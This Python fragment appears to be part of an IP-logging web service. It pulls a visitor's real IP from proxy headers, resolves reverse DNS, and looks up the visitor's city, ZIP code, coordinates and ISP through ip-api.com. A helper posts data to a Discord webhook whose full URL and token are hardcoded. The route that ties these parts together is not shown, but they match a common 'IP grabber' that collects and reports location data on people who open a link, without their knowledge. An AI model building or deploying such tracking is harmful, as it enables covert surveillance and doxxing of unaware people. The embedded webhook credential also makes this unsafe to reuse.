# ================== CONFIG ==================

DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK_URL', 'https://canary.discord.com/api/webhooks/1477820611756691520/h16fojr9j9VJjj9f6sv5ksacSwcGI5IjOFKGursEsJfxhth5Ip5eu2fxAdEgaxfsrNwW')

if not DISCORD_WEBHOOK:
    raise RuntimeError("DISCORD_WEBHOOK_URL not set")

REQUEST_LIMIT = 60  # per minute per server
lock = Lock()
REQUEST_COUNT = 0
LAST_RESET = time.time()

GEO_CACHE: Dict[str, Dict[str, Any]] = {}

# ================== RATE LIMIT ==================

def rate_limit_check() -> bool:
    global REQUEST_COUNT, LAST_RESET
    with lock:
        now = time.time()
        if now - LAST_RESET > 60:
            REQUEST_COUNT = 0
            LAST_RESET = now
        REQUEST_COUNT += 1
        return REQUEST_COUNT <= REQUEST_LIMIT

# ================== IP HELPERS ==================

def get_real_ip() -> str:
    # Check common proxy headers
    for header in ["X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP"]:
        val = request.headers.get(header)
        if val:
            return val.split(",")[0].strip()
    return request.remote_addr or "127.0.0.1"

def safe_reverse_dns(ip: str) -> str:
    try:
        ipaddress.ip_address(ip)
        return socket.gethostbyaddr(ip)[0].lower()
    except Exception:
        return "N/A"

# ================== GEOLOCATION ==================

def get_geolocation(ip: str) -> Dict[str, Any]:
    if ip in GEO_CACHE:
        return GEO_CACHE[ip]

    try:
        # Use ip-api.com with all fields enabled
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5)
        if r.status_code == 200:
            data = r.json()
            geo = {
                "country": data.get("country", "Unknown"),
                "countryCode": data.get("countryCode", "??"),
                "region": data.get("regionName", "Unknown"),
                "city": data.get("city", "Unknown"),
                "zip": data.get("zip", "Unknown"),
                "lat": data.get("lat", 0),
                "lon": data.get("lon", 0),
                "timezone": data.get("timezone", "Unknown"),
                "isp": data.get("isp", "Unknown"),
                "org": data.get("org", "Unknown"),
                "as": data.get("as", "Unknown"),
                "mobile": data.get("mobile", False),
                "proxy": data.get("proxy", False),
                "hosting": data.get("hosting", False)
            }
            GEO_CACHE[ip] = geo
            return geo
    except:
        pass

    return {"country": "Unknown", "countryCode": "??"}

# ================== DISCORD SEND ==================

def send_webhook(data: dict):
    try:
        requests.post(DISCORD_WEBHOOK, json=data, timeout=5)
    except:
        pass

